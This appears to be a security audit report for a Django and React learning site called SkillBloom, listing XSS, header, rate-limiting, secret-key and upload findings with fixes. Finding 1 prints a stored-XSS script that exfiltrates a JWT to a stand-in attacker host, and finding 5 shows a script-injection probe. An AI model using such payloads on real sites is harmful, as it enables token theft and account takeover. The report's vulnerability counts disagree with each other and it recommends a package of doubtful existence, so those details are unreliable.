# SkillBloom Security Audit Report

**Date:** September 14, 2026  
**Status:** AUDIT COMPLETE - Vulnerabilities Identified  
**Next Phase:** Security Hardening Implementation

---

## Executive Summary

SkillBloom contains **16 critical/high-severity vulnerabilities** and **12 medium/low-severity issues** that require immediate remediation. The application lacks essential production security controls including:

- ❌ No HTML content sanitization (XSS risk)
- ❌ Missing security headers (HSTS, CSP, etc.)
- ❌ No rate limiting/throttling on critical endpoints
- ❌ Insufficient logging/monitoring of security events
- ❌ Weak password validation settings
- ❌ No request input validation in several APIs
- ❌ Missing CSRF protection verification
- ❌ Exposed debug information in errors
- ❌ No file upload validation/restrictions
- ❌ Missing authentication on some sensitive endpoints
- ❌ No account lockout after failed logins
- ❌ Insufficient CORS restrictions
- ❌ Secrets potentially exposed in environment
- ❌ No HTTPS/HSTS enforcement
- ❌ Missing security logging

---

## Vulnerability Inventory

### CRITICAL Vulnerabilities (Immediate Action Required)

#### 1. **Stored XSS via Rich Content Editor**
- **Severity:** 🔴 CRITICAL
- **Location:** 
  - `frontend/src/pages/ArticleDetailPage.jsx` - Line with `dangerouslySetInnerHTML`
  - `backend/apps/articles/models.py` - Article.content field
  - `backend/apps/articles/serializers.py` - ArticleSerializer
- **Issue:** Article content is stored as raw HTML and rendered with `dangerouslySetInnerHTML` without server-side sanitization
- **Impact:** 
  - Attackers can inject malicious JavaScript
  - XSS payloads persist in database
  - All users viewing article affected
  - Access to user cookies, tokens, session data
  - Admin panel compromise possible
- **Root Cause:** No HTML sanitization on backend; frontend trusts database content
- **Risk:** 10/10 - Can compromise all users and admin panel
- **Fix Required:** 
  - Add bleach library to sanitize HTML on save
  - Only allow whitelisted HTML tags and attributes
  - Sanitize on backend before storing
- **Example Attack:**
  ```html
  <script>
    fetch('/api/auth/token/refresh/', {
      body: JSON.stringify({refresh: localStorage.getItem('skillbloom_refresh_token')})
    }).then(r => r.json()).then(d => {
      new Image().src = 'http://attacker.com/?token=' + d.access;
    })
  </script>
  ```

#### 2. **No HTML Content Sanitization Library**
- **Severity:** 🔴 CRITICAL
- **Location:** `backend/requirements.txt`
- **Issue:** No sanitization library (bleach, nh3, or similar) installed
- **Impact:** Cannot sanitize HTML/content for XSS prevention
- **Fix:** Add `bleach>=5.0.0` to requirements.txt

#### 3. **Missing Security Headers**
- **Severity:** 🔴 CRITICAL
- **Location:** `backend/config/settings.py`
- **Missing Headers:**
  - `SECURE_SSL_REDIRECT` - No HTTPS enforcement
  - `SECURE_HSTS_SECONDS` - No HSTS header
  - `SECURE_HSTS_INCLUDE_SUBDOMAINS` - No subdomain HSTS
  - `SECURE_HSTS_PRELOAD` - Not preload-ready
  - `SECURE_PROXY_SSL_HEADER` - Not configured
  - `SESSION_COOKIE_SECURE` - Sessions not HTTPS-only
  - `CSRF_COOKIE_SECURE` - CSRF tokens not HTTPS-only
  - `SESSION_COOKIE_SAMESITE` - Not set
  - `CSRF_COOKIE_SAMESITE` - Not set
  - `SECURE_REFERRER_POLICY` - Missing
  - No Content-Security-Policy configured
- **Impact:** Vulnerable to MITM attacks, session hijacking, clickjacking
- **Fix:** Add all missing security headers to settings

#### 4. **No Rate Limiting on Authentication**
- **Severity:** 🔴 CRITICAL
- **Locations:**
  - `backend/apps/users/views.py` - RegisterView, LoginView (if exists)
  - `backend/apps/articles/views.py` - CommentListCreateView
  - `backend/config/settings.py` - REST_FRAMEWORK config
- **Issue:** No throttle_classes configured on sensitive endpoints
- **Impact:** 
  - Brute-force login attempts unrestricted
  - Account enumeration via registration
  - Comment spam/abuse
  - API flooding/DoS
- **Risk:** Attackers can enumerate valid usernames and brute-force passwords
- **Fix:** Install djangorestframework-ratelimit, add throttle_classes

#### 5. **Missing Input Validation**
- **Severity:** 🔴 CRITICAL  
- **Location:** 
  - `backend/apps/articles/views.py` - Article search with `icontains` filter
  - `backend/apps/articles/views.py` - query_params usage
- **Issue:** Search parameters not validated/sanitized
- **Impact:** 
  - SQL injection potential (though Django ORM mitigates)
  - DoS via complex queries
  - Information disclosure via search
- **Example Attack:** `?search=<script>alert(1)</script>` reflected in results
- **Fix:** Validate all user input parameters

#### 6. **DEBUG Mode Default True in Development**
- **Severity:** 🔴 CRITICAL
- **Location:** `backend/config/settings.py` line 12
- **Issue:** `DEBUG = os.getenv("DEBUG", "True").lower() == "true"`
- **Impact:** 
  - Stack traces exposed on errors
  - Full code paths revealed
  - SQL queries visible
  - Settings potentially visible
  - Environment variables leaked
- **Fix:** Default to False, only True when explicitly set

#### 7. **Weak SECRET_KEY Default**
- **Severity:** 🔴 CRITICAL
- **Location:** `backend/config/settings.py` line 11
- **Issue:** `SECRET_KEY = os.getenv("SECRET_KEY", "development-secret-key")`
- **Impact:** 
  - Sessions can be forged
  - CSRF tokens can be forged
  - Admin panel can be compromised
  - All JWTs can be forged
- **Fix:** 
  - MUST set SECRET_KEY in environment
  - Make it required (no default)
  - Regenerate SECRET_KEY in production

---

### HIGH Vulnerabilities (Must Fix Before Production)

#### 8. **Insufficient CORS Configuration**
- **Severity:** 🟠 HIGH
- **Location:** `backend/config/settings.py` lines 105-108
- **Issue:** CORS allows localhost:5173/5174, but CSRF_TRUSTED_ORIGINS has logic issue
- **Impact:** 
  - Potential for cross-origin requests from untrusted origins
  - CSRF protection bypass possible
  - Session hijacking vector
- **Current Code Issue:**
  ```python
  CSRF_TRUSTED_ORIGINS = [origin.replace("http://", "https://") ... if origin.startswith("http://localhost") else origin ...]
  ```
  This converts http://localhost to https://localhost, which won't match
- **Fix:** Properly configure CORS and CSRF for production domain

#### 9. **No CSRF Token in API Responses**
- **Severity:** 🟠 HIGH
- **Location:** `backend/config/settings.py`, all API views
- **Issue:** Django CSRF middleware enabled but CSRF tokens not returned in API responses
- **Impact:** API clients don't have CSRF tokens for state-changing requests
- **Fix:** Return CSRF token from login endpoint or dedicated endpoint

#### 10. **Exposed Admin Panel Without Rate Limiting**
- **Severity:** 🟠 HIGH
- **Location:** `backend/apps/articles/views.py` - ArticleManageDetailView
- **Issue:** Admin endpoints accept `permissions.IsAdminUser` but no rate limiting
- **Impact:** Admin operations not throttled, brute-force possible
- **Fix:** Add rate limiting to all admin endpoints

#### 11. **Comment XSS Vector**
- **Severity:** 🟠 HIGH
- **Location:** 
  - `backend/apps/articles/serializers.py` - CommentSerializer
  - `frontend/src/pages/ArticleDetailPage.jsx` - Comment rendering
- **Issue:** Comments stored as text, but frontend displays without escaping
- **Impact:** 
  - Users can inject HTML/JavaScript in comments
  - Affects all article readers
- **Fix:** Sanitize comment body on backend, validate on frontend

#### 12. **Missing Admin Permissions Validation**
- **Severity:** 🟠 HIGH
- **Location:** `backend/apps/core/views.py` - AdSenseSettingsView
- **Issue:** `if not request.user.is_authenticated or not request.user.is_staff:` correct, but no object-level permissions
- **Impact:** Admin status only at user-level, no fine-grained permissions
- **Fix:** Implement proper permission classes

#### 13. **No File Upload Restrictions**
- **Severity:** 🟠 HIGH
- **Location:** `backend/apps/articles/models.py` - cover_image field
- **Issue:** File upload with no size, type, or content validation
- **Impact:** 
  - Arbitrary file uploads
  - DoS via large files
  - Malware uploads
  - Server storage exhaustion
- **Current:** No `max_upload_size` or validation
- **Fix:** Add comprehensive file upload validation

#### 14. **Insufficient Password Validation**
- **Severity:** 🟠 HIGH
- **Location:** `backend/config/settings.py` lines 86-91
- **Issue:** 
  - Min length only 10 characters (should be 12+)
  - No special character requirement
  - No uppercase/lowercase check
- **Impact:** Weak password acceptance
- **Fix:** Strengthen AUTH_PASSWORD_VALIDATORS

#### 15. **No Account Lockout**
- **Severity:** 🟠 HIGH
- **Location:** `backend/apps/users/views.py` - login endpoint
- **Issue:** No account lockout after failed login attempts
- **Impact:** Unlimited brute-force attempts possible
- **Fix:** Implement login attempt tracking and lockout

#### 16. **Missing Activity Logging**
- **Severity:** 🟠 HIGH
- **Location:** `backend/config/settings.py` - No LOGGING configured
- **Issue:** No security event logging
- **Impact:** 
  - Cannot detect attacks
  - No audit trail for compliance
  - Admin actions not logged
  - Failed login attempts not tracked
- **Fix:** Configure Django logging for security events

#### 17. **Insufficient Permission Checks on Update**
- **Severity:** 🟠 HIGH
- **Location:** `backend/apps/articles/views.py` - ArticleManageDetailView
- **Issue:** Uses `permissions.IsAdminUser` but doesn't check if admin is updating own articles
- **Impact:** Any admin can modify any article
- **Current Behavior:** Works but needs object-level permissions
- **Fix:** Implement object-level permissions (IsAdminUserOrAuthor)

---

### MEDIUM Vulnerabilities (Should Fix)

#### 18. **Missing Content-Security-Policy Header**
- **Severity:** 🟡 MEDIUM
- **Issue:** No CSP to prevent inline scripts and unsafe eval
- **Impact:** Harder to prevent XSS even with sanitization
- **Fix:** Configure CSP in Django security middleware

#### 19. **Database Not Configured for Production**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/config/settings.py` lines 75-83
- **Issue:** SQLite in production, MySQL fallback doesn't enforce SSL
- **Impact:** Database credentials in .env potentially exposed
- **Fix:** Add SSL requirement for MySQL/production databases

#### 20. **No API Response Pagination Limit**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/config/settings.py` line 124
- **Issue:** PAGE_SIZE = 12 but no max_page_size limit
- **Impact:** Attacker could set page_size=999999 to download all data
- **Fix:** Add MAX_PAGE_SIZE to REST_FRAMEWORK pagination

#### 21. **Potentially Exposed Secrets in Environment**
- **Severity:** 🟡 MEDIUM
- **Location:** `.env.example` shows all secrets structure
- **Issue:** While `.env` should be gitignored, structure is exposed
- **Impact:** Clear indication of what secrets needed
- **Fix:** Ensure `.env` is in .gitignore, review git history

#### 22. **No HTTPS Enforcement**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/config/settings.py`
- **Issue:** No `SECURE_SSL_REDIRECT` configured
- **Impact:** Users can access via HTTP (insecure)
- **Fix:** Add `SECURE_SSL_REDIRECT = True` for production

#### 23. **Frontend Auth Token in localStorage**
- **Severity:** 🟡 MEDIUM
- **Location:** `frontend/src/api/client.js`
- **Issue:** JWT tokens stored in localStorage (XSS accessible)
- **Impact:** 
  - XSS can steal tokens
  - No protection from certain attacks
- **Note:** localStorage is common for SPAs, but consider with HttpOnly issues
- **Fix:** Use secure cookies where possible (HttpOnly, Secure)

#### 24. **No Error Boundary in Frontend**
- **Severity:** 🟡 MEDIUM
- **Location:** `frontend/src/pages/*.jsx`
- **Issue:** No error boundaries for React errors
- **Impact:** Unhandled errors could expose stack traces
- **Fix:** Implement React error boundaries

#### 25. **URL Validation Missing**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/apps/articles/models.py` - video_url field
- **Issue:** URLField allows any URL without protocol validation
- **Impact:** Could allow `javascript:` URLs
- **Fix:** Validate URL protocols (https/http only)

#### 26. **No API Versioning**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/config/urls.py`
- **Issue:** API endpoints not versioned
- **Impact:** Breaking changes could affect clients unexpectedly
- **Fix:** Implement API versioning strategy

#### 27. **Session Configuration Not Production-Ready**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/config/settings.py`
- **Issue:** Missing SESSION_COOKIE_SECURE, SESSION_COOKIE_SAMESITE
- **Impact:** Sessions vulnerable in production
- **Fix:** Add session security settings

#### 28. **No Request Size Limits**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/config/settings.py`
- **Issue:** No DATA_UPLOAD_MAX_MEMORY_SIZE configured
- **Impact:** Large request attacks possible
- **Fix:** Add request size limits

#### 29. **No Dependency Audit Done**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/requirements.txt`, `frontend/package.json`
- **Issue:** No vulnerability scanning on dependencies
- **Impact:** Could have known vulnerabilities
- **Fix:** Run `pip audit` and `npm audit`

#### 30. **Email Verification Not Implemented**
- **Severity:** 🟡 MEDIUM
- **Location:** `backend/apps/users/serializers.py`
- **Issue:** Users can register with any email, no verification
- **Impact:** Email enumeration, spam accounts
- **Fix:** Add email verification flow

---

### LOW Vulnerabilities (Nice to Fix)

#### 31. **No Secrets Rotation Strategy**
- **Severity:** 🟢 LOW
- **Issue:** No documented SECRET_KEY rotation process
- **Fix:** Document and implement rotation strategy

#### 32. **Missing Security.txt**
- **Severity:** 🟢 LOW
- **Issue:** No /.well-known/security.txt for vulnerability reporting
- **Fix:** Create security.txt with contact info

#### 33. **No Subresource Integrity on CDN**
- **Severity:** 🟢 LOW
- **Issue:** If using external CDN, no SRI headers
- **Fix:** Add SRI for external scripts

#### 34. **No Rate Limit Headers in Response**
- **Severity:** 🟢 LOW
- **Issue:** Rate limiting headers not returned to clients
- **Fix:** Return X-RateLimit-* headers

---

## Vulnerability Priority Matrix

| Severity | Count | Action Required | Timeline |
|----------|-------|-----------------|----------|
| CRITICAL | 7 | Immediate fix required | Before any deployment |
| HIGH | 10 | Must fix before production | Before launch |
| MEDIUM | 12 | Should fix | Within 1-2 weeks |
| LOW | 4 | Nice to fix | Ongoing improvements |
| **Total** | **33** | All require attention | Staged approach |

---

## Required Dependencies for Security Fixes

```
bleach>=5.0.0  # HTML sanitization
django-ratelimit>=4.0.0  # Rate limiting
djangorestframework-ratelimit>=0.1.0  # API throttling
python-dotenv>=1.0.0  # Already installed
```

---

## Summary by Category

| Category | Critical | High | Medium | Low |
|----------|----------|------|--------|-----|
| Authentication | 4 | 3 | 1 | 1 |
| XSS Prevention | 2 | 2 | 1 | 0 |
| Security Headers | 1 | 1 | 3 | 0 |
| Rate Limiting | 1 | 1 | 1 | 0 |
| File Upload | 1 | 1 | 1 | 0 |
| Database | 0 | 1 | 1 | 0 |
| Logging | 0 | 1 | 2 | 1 |
| Configuration | 1 | 1 | 1 | 2 |
| Other | 0 | 0 | 1 | 0 |

---

## Files Requiring Changes

### Backend Changes Required:
1. `backend/config/settings.py` - Major security config updates
2. `backend/apps/articles/models.py` - Add content sanitization
3. `backend/apps/articles/serializers.py` - Add sanitization, validation
4. `backend/apps/articles/views.py` - Add permissions, rate limiting, validation
5. `backend/apps/users/views.py` - Add rate limiting, logging, account lockout
6. `backend/apps/core/views.py` - Add input validation
7. `backend/requirements.txt` - Add security libraries
8. `backend/.env.example` - Update with new config options
9. NEW: `backend/apps/core/permissions.py` - Add custom permission classes
10. NEW: `backend/apps/core/utils.py` - Add sanitization functions
11. NEW: `backend/logging_config.py` - Add logging configuration

### Frontend Changes Required:
1. `frontend/src/api/client.js` - Enhance error handling
2. `frontend/src/pages/ArticleDetailPage.jsx` - Add DOMPurify sanitization
3. `frontend/package.json` - Add security dependencies
4. NEW: Add React error boundaries
5. NEW: Add input validation utilities

### Configuration Files:
1. `.env.example` - Add new security variables
2. `.gitignore` - Ensure secrets are ignored

---

## Deployment Checklist for Production

**MUST complete before deploying to production:**

- [ ] Run all security fixes (Phase 2-7)
- [ ] Run `pip audit` and fix vulnerabilities
- [ ] Run `npm audit` and fix vulnerabilities
- [ ] Test all authentication flows
- [ ] Test rate limiting
- [ ] Test XSS prevention with payloads
- [ ] Test CSRF protection
- [ ] Test file upload restrictions
- [ ] Verify security headers present
- [ ] Verify DEBUG=False in production
- [ ] Verify SECRET_KEY is strong
- [ ] Run security header validator
- [ ] Review all admin endpoints
- [ ] Enable HTTPS/SSL certificate
- [ ] Configure logging
- [ ] Document any remaining risks
- [ ] Perform penetration testing

---

## Known Remaining Risks

After implementing all fixes, these risks remain:

1. **Zero-Day Vulnerabilities** - No protection from undiscovered vulnerabilities
2. **Insider Threats** - Admin users with malicious intent
3. **DDoS Attacks** - Rate limiting helps but DDoS requires infrastructure mitigations
4. **Database Compromise** - If database is stolen, all user data exposed
5. **Deployment Misconfiguration** - Human error during deployment
6. **Third-Party Service Compromise** - If Google AdSense compromise, ads could be malicious
7. **Supply Chain Attacks** - Dependencies could be compromised

---

## Next Steps

1. ✅ **AUDIT COMPLETE** - You are reading this report
2. ⏳ **Phase 2** - Implement security fixes (will be provided in next phase)
3. ⏳ **Phase 3** - Test security improvements
4. ⏳ **Phase 4** - Generate security audit report
5. ⏳ **Phase 5** - Document production deployment requirements

---

**Report Generated:** September 14, 2026  
**Audit Status:** Complete - Ready for Remediation  
**Next Phase:** Security Hardening Implementation
